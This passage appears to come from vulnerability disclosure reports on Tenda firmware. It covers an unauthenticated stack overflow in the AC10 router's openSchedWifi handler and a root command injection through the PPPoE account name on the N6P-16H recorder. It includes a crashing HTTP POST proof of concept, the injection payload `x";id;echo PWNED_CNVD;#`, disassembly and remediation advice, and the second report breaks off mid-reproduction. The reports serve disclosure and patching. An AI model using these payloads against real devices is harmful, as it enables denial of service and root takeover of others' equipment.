函数: setSchedWifi (地址 0x00472214) - openSchedWifi goform接口的内部处理函数
漏洞参数: schedStartTime (通过 websGetVar 获取)
危险调用: strcpy (将schedStartTime值复制到栈缓冲区)
栈帧大小: 640 字节 (addiu sp,sp,-0x280 at 0x00472220)
返回地址偏移: ra 保存在 sp+0x27c (sw ra, var_4h at 0x00472224)
溢出路径: websGetVar(wp, "schedStartTime", ...) -> strcpy(stack_buf, schedStartTime) -> 覆盖 ra
```

## Exploitation

Preconditions:

- The router's web service is reachable over the network. No credentials are required.

Steps (reproduction used `chroot` + `qemu-mipsel-static` user-mode emulation of the extracted rootfs in WSL2, with binfmt_misc registered for mipsel and the address 192.168.1.1/24 bound to a bridge):

1. Verify the firmware MD5, extract the SquashFS root filesystem at offset 2040812 and confirm `fireversion=ac10v4_V16.03.10.13(499)_cn`.
2. Start the target:

```bash
chroot squashfs-root /usr/bin/qemu-mipsel-static /bin/httpd &
# ****** WeLoveLinux******
# webs: Listening for HTTP requests at address 192.168.1.1
```

3. Baseline check: `GET http://192.168.1.1/` returns HTTP 302 (redirect to the login page) and the process is alive.
4. Send the overflow request (2000 bytes in `schedStartTime`, far exceeding the 640-byte stack frame):

```http
POST /goform/openSchedWifi HTTP/1.1
Host: 192.168.1.1
Content-Type: application/x-www-form-urlencoded

schedWifiEnable=1&schedStartTime=AAAA... (2000 bytes) ...&schedEndTime=22:00&timeType=0&day=1,1,1,1,1,1,1
```

5. Result: `strcpy` writes past the buffer, overwrites the saved `ra`, and the httpd process dies with a segmentation fault:

```
/bin/bash: line 27: 17263 Segmentation fault (core dumped) chroot "$ROOTFS" /usr/bin/qemu-mipsel-static /bin/httpd
--- post-attack verification ---
httpd process: NOT FOUND (crashed)
Connection refused - service is down
VERDICT SUCCESS: httpd crashed due to stack buffer overflow in openSchedWifi, DoS confirmed
```

Control test: sending a short (benign) `schedStartTime` returns HTTP 200 and the process survives, confirming the crash is caused by the overflow rather than a general fault.

## Evidence

![Automated reproduction (repro.sh): firmware verified and unpacked, httpd started under qemu-mipsel, PoC sent, httpd segfaulted (core dumped) and port refused connections afterwards](AC10_images/fig1.png)

Supporting text evidence from the package:

- `code_location.txt` — static location of the vulnerable function, the 640-byte stack frame, the saved `ra` at sp+0x27c and the overflow path.
- `httpd-boot.transcript` — httpd boot output `webs: Listening for HTTP requests at address 192.168.1.1`, proving the service reached the listening state in the emulation environment.
- `vuln3-openSchedWifi.transcript` — a real crash record: `Segmentation fault (core dumped)`, `httpd process: NOT FOUND (crashed)`, `Connection refused`, `VERDICT SUCCESS`.

## Impact

An unauthenticated attacker can crash the router's web service with a single HTTP request, causing a remote denial of service (httpd exits with SIGSEGV; the management UI becomes unreachable until the process is restarted by the device). Because the overflow overwrites the saved return address on the stack, the same primitive is also a potential path to remote code execution with a crafted payload.

## Remediation Suggestions

1. Enforce a length check on the `schedStartTime` parameter so it cannot exceed the destination buffer size.
2. Replace `strcpy` with bounded copies such as `strncpy` or `snprintf`.
3. Compile with stack protection enabled (`-fstack-protector-all`).
4. Enable ASLR and NX to raise exploitation difficulty.
5. Add authentication checks to `/goform/` endpoints.
6. Upgrade the firmware to the latest version.

## References

- Official firmware download: https://static.tenda.com.cn/tdcweb/download/uploadfile/AC10%20v4.0/AC10v4%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B6%20V16.03.10.13.zip

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Tenda N6P-16H V12.1.5.16: Kylin WritePppConfig PPPoE Account Name OS Command Injection (Authenticated, Root RCE)
content:
# Tenda N6P-16H V12.1.5.16: Kylin WritePppConfig PPPoE Account Name OS Command Injection (Authenticated, Root RCE)

## Vulnerability Type / CWE

- OS command injection (CWE-78)
- Executed by the device's main business daemon as root, yielding full device compromise

## Affected Product

| Field | Value |
| --- | --- |
| Vendor | Tenda |
| Product | N6P-16H (16-channel PoE network video recorder / NVR) |
| Model | N6P-16H (DeviceType=N6P, Channel=16) |
| Firmware filename & version | US_N6P-16HV1.0mc_V12.1.5.16_cn_TDC01.bin (SWVersion=V12.1.5.16, HWVersion=V1.0, CustomerId=TDC01, BuildDate=2023-08-07) |
| Severity | High |
| Component | `/bin/Kylin` in user-x.squash.img (mounted at `/opt/app/bin/Kylin`), function `WritePppConfig()` @ 0x00011B638 (`../../Functions/PPPoEConnect.cpp:423`), dangerous call `system()` wrapper @ 0x004C6F48 |

Firmware md5: `3e5f69ebdb9b65f78411256892404c2f`

## Vulnerability Description

When saving or applying PPPoE dial-up configuration, the main daemon `Kylin` calls `WritePppConfig()` to rewrite the pppd configuration file. To update the account name in `pppoe.conf`, the function builds a `sed` command by string formatting and passes it to `system()`:

```c
system("sed -i \"/USER=.*/c USER='%s'\" %s", pppUserName, "/opt/sav/Config/ppp/pppoe.conf");
```

The `%s` is the PPPoE account name entered through the web management interface / RPC2 (`StartPppConfig()` at 0x00011BC40 copies it via `strcpy` into the config structure at offset +0x184). The firmware applies no whitelist validation, no length limit and no shell escaping to it.

Because the account name is placed inside the double-quoted `sed` expression (`"/USER=.*/c USER='%s'"`), a single double quote `"` in the account name closes the shell's double-quoted region; the attacker can then use `;` to append arbitrary commands and `#` to comment out the remainder. For example, with the account name `x";id;echo PWNED_CNVD;#`, the shell actually receives:

```
sed -i "/USER=.*/c USER='x";id;echo PWNED_CNVD;#'" /opt/sav/Config/ppp/pppoe.conf
```

which the shell splits into three commands: a truncated `sed` (fails with "no input files"), `id`, and `echo PWNED_CNVD`. `Kylin` runs as root, so `id` reports `uid=0(root) gid=0(root)`, proving the injected command executes with root privileges. Additionally, the same function writes the account name verbatim into `/opt/sav/Config/ppp/chap-secrets` and `pap-secrets` (`snprintf(buf, 1023, "\"%s\" * \"%s\"", user, pass)`), so the injection payload persists on the writable jffs2 partition across reboots.

Trigger: saving the PPPoE account in the web management UI (configManager.cgi / RPC2 `setConfig`, WAN-PPPoE module), or an automatic WAN re-dial after link failure or reboot — the reconnect path also calls `WritePppConfig()` to rewrite the `USER` line of `pppoe.conf`.

## Root Cause Analysis

Decompiled vulnerable function:

```c
int WritePppConfig(char *pppConn, char *userName, char *passWord) {
    char chap[1024];
    strcpy(chap, "/opt/sav/Config/ppp/chap-secrets");            // 0x11b644
    // ---- injection sink: userName enters a shell command unfiltered ----
    system("sed -i \"/USER=.*/c USER='%s'\" %s",                 // 0x11b660
           userName,                                             // -> sp+1056
           "/opt/sav/Config/ppp/pppoe.conf");                    // 0x11b658
    memset(chap + 8, 0, 1024);
    f = fopen("/opt/sav/Config/ppp/chap-secrets", "w+");         // 0x11b678
    snprintf(chap + 8, 1023, "\"%s\" * \"%s\"", userName, passWord);  // 0x11b6c4
    fwrite(chap + 8, 1, strlen(chap + 8), f); fclose(f);
    f = fopen("/opt/sav/Config/ppp/pap-secrets", "w+");          // 0x11b6f0
    // same snprintf/fwrite logic writes pap-secrets
    return 1;                                                    // 0x11b770
}
```

Key ARM instructions at the injection site:

```
11b658: ldr  r2, [pc, #300]   ; "/opt/sav/Config/ppp/pppoe.conf" (0x00E0FEBC)
11b65c: add  r1, sp, #1056    ; r1 -> stack slot holding userName pointer
11b660: ldr  r0, [pc, #296]   ; "sed -i \"/USER=.*/c USER='%s'\" %s" (0x00E102CE)
11b664: bl   0x4c6f48         ; system() wrapper - dangerous call
11b690: movw r2, #423         ; debug line number, corroborating PPPoEConnect.cpp:423
```

Four findings from the audit:

1. The call target 0x004C6F48 is Kylin's own `system()` wrapper: it `vsnprintf`s into a 368-byte stack buffer (`sub sp, sp, #368` at 0x4c6f54) then calls `system@plt` (0x0049FBCC), which ends in uClibc `system()` forking `/bin/sh -c`. It is a real shell sink, not a string-building dead end.
2. The taint chain is complete and unfiltered: the caller `StartPppConfig()` (0x00011BC40, PPPoEConnect.cpp:374) stores the arguments with `stm r5, {r1, r2, r3}`, then performs two unchecked `bl strcpy@plt` calls at 0x00011BCC8 / 0x00011BCD4 copying account and password into fixed structure fields +0x184 / +0x1C4, and reaches `WritePppConfig()` via `bl 11b638` at 0x00011BD40. No filter exists between the web form and `system()`.
3. Quote escape mechanics: the format string places the account name inside the shell's double quotes; single quotes are literal inside double quotes, so the only escape character is `"`. This is why the default payload is `x";id;echo PWNED_CNVD;#` — a single-quote payload (tested as a control case, below) cannot escape and is treated by `sed` as literal text.
4. Side effects: the same function persists the raw account name into `chap-secrets` / `pap-secrets` under `/opt/sav`; and the two unbounded `strcpy` calls at 0x00011BCC8 / 0x00011BCD4 into fixed fields +0x184 / +0x1C4 constitute a potential buffer overflow.

## Exploitation

Preconditions:

- Attacker has authenticated access to the device web management interface (admin), or can wait for the automatic WAN re-dial path that reuses a previously stored malicious account name.

Steps (research reproduction used Unicorn instruction-level emulation of the real firmware machine code, intercepting PLT calls and handing the constructed command line to a real `/bin/sh -c`):

1. Extract the firmware: unzip the delivery ZIP, treat the `.bin` as a ZIP container, strip the 0x40-byte private header so the `hsqs` superblock is at offset 0, then `unsquashfs` the `user-x.squash.img` partition.
2. Verify the firmware hash and version:

```
$ md5sum ./extract/US_N6P-16HV1.0mc_V12.1.5.16_cn_TDC01.bin
3e5f69ebdb9b65f78411256892404c2f  ./extract/US_N6P-16HV1.0mc_V12.1.5.16_cn_TDC01.bin
$ cat ./extract/custom-root/version
SWVersion=V12.1.5.16
BuildDate=2023-08-07
DeviceType=N6P
Channel=16
HWVersion=V1.0
CustomerId=TDC01
```

3. Benign baseline (`--boot`, account `isp_user@isp.example.net`): the firmware constructs `sed -i "/USER=.*/c USER='isp_user@isp.example.net'" /opt/sav/Config/ppp/pppoe.conf` and no extra command is injected — verdict FAILED as expected.
